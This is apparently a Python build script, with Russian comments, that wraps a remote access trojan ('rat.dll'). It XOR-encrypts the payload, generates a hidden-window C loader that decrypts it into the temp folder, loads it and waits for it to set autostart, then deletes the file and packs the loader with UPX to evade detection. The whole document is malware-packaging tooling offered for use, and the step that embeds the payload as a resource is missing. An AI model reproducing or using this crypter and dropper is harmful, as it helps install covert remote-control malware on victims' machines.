import os
import sys
import subprocess
import random
import string
import shutil

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("BUILDING EXE TO DLL CONVERTER")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading source EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
    
    # Проверка, что это EXE
    if len(exe_data) < 2 or exe_data[0] != 0x4D or exe_data[1] != 0x5A:
        print("ERROR: Not a valid EXE file (missing MZ header)!")
        return None
    print("EXE header OK (MZ)")
    
    # Конвертируем EXE в DLL
    print("Converting EXE to DLL...")
    dll_path = os.path.join(output_dir, 'rat.dll')
    
    # Способ 1: Просто переименовываем (иногда работает)
    # shutil.copy2(exe_path, dll_path)
    
    # Способ 2: Используем pe2dll (если установлен)
    try:
        result = subprocess.run(['pe2dll.exe', exe_path, dll_path], capture_output=True)
        if result.returncode == 0:
            print("PE2DLL conversion OK")
        else:
            # Если pe2dll нет - просто копируем
            shutil.copy2(exe_path, dll_path)
            print("PE2DLL not found, using copy method")
    except:
        shutil.copy2(exe_path, dll_path)
        print("PE2DLL not found, using copy method")
    
    print(f"DLL size: {os.path.getsize(dll_path) / (1024*1024):.1f} MB")
    
    print("Encrypting DLL with XOR...")
    with open(dll_path, 'rb') as f:
        dll_data = f.read()
    
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(dll_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Сохраняем зашифрованные данные как бинарный файл
    data_bin = os.path.join(output_dir, f'{generate_random_name()}.bin')
    with open(data_bin, 'wb') as f:
        f.write(encrypted)
    
    key_bin = os.path.join(output_dir, f'{generate_random_name()}.bin')
    with open(key_bin, 'wb') as f:
        f.write(key)
    
    print("Creating loader...")
    
    loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

// Данные вставляются через ресурсы
// Используем простой XOR

int main() {
    char dll_path[MAX_PATH];
    char temp_path[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_path);
    
    // Случайное имя для DLL
    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    char filename[13];
    for(int i = 0; i < 12; i++) {
        filename[i] = chars[rand() % 36];
    }
    filename[12] = '\\0';
    sprintf(dll_path, "%s%s.dll", temp_path, filename);
    
    // Загружаем DLL из ресурсов
    HMODULE hModule = GetModuleHandleA(NULL);
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCE(101), "DLL");
    if (!hRes) {
        MessageBoxA(NULL, "Resource not found!", "Error", MB_OK);
        return 1;
    }
    
    HGLOBAL hData = LoadResource(hModule, hRes);
    if (!hData) {
        MessageBoxA(NULL, "Failed to load resource!", "Error", MB_OK);
        return 1;
    }
    
    DWORD data_size = SizeofResource(hModule, hRes);
    unsigned char* enc_data = (unsigned char*)LockResource(hData);
    
    // Расшифровываем XOR
    // Ключ тоже в ресурсах
    HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCE(102), "KEY");
    if (!hKeyRes) {
        MessageBoxA(NULL, "Key resource not found!", "Error", MB_OK);
        return 1;
    }
    
    HGLOBAL hKeyData = LoadResource(hModule, hKeyRes);
    if (!hKeyData) {
        MessageBoxA(NULL, "Failed to load key!", "Error", MB_OK);
        return 1;
    }
    
    DWORD key_size = SizeofResource(hModule, hKeyRes);
    unsigned char* key_data = (unsigned char*)LockResource(hKeyData);
    
    unsigned char* decrypted = (unsigned char*)malloc(data_size);
    if (!decrypted) {
        MessageBoxA(NULL, "Memory allocation failed!", "Error", MB_OK);
        return 1;
    }
    
    memcpy(decrypted, enc_data, data_size);
    
    // XOR decrypt
    for(DWORD i = 0; i < data_size; i++) {
        decrypted[i] ^= key_data[i % key_size];
    }
    
    // Сохраняем DLL
    HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Failed to create DLL file!", "Error", MB_OK);
        free(decrypted);
        return 1;
    }
    
    DWORD written;
    WriteFile(hFile, decrypted, data_size, &written, NULL);
    CloseHandle(hFile);
    
    // Загружаем DLL
    HMODULE hDll = LoadLibraryA(dll_path);
    if (!hDll) {
        MessageBoxA(NULL, "Failed to load DLL!", "Error", MB_OK);
        DeleteFileA(dll_path);
        free(decrypted);
        return 1;
    }
    
    // Запускаем RAT (DllMain уже выполнился при LoadLibrary)
    // Ждем пока RAT сделает автозагрузку
    Sleep(15000);
    
    // Очистка
    FreeLibrary(hDll);
    DeleteFileA(dll_path);
    free(decrypted);
    
    return 0;
}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling loader...")
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
    
    cmd = [
        'gcc',
        loader_src,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True)
        print("Compilation OK")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr.decode()}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
        print("UPX compression OK")
    except:
        print("UPX compression skipped or failed")
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    # Cleanup
    try:
        os.remove(loader_src)
        os.remove(data_bin)
        os.remove(key_bin)
        os.remove(dll_path)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
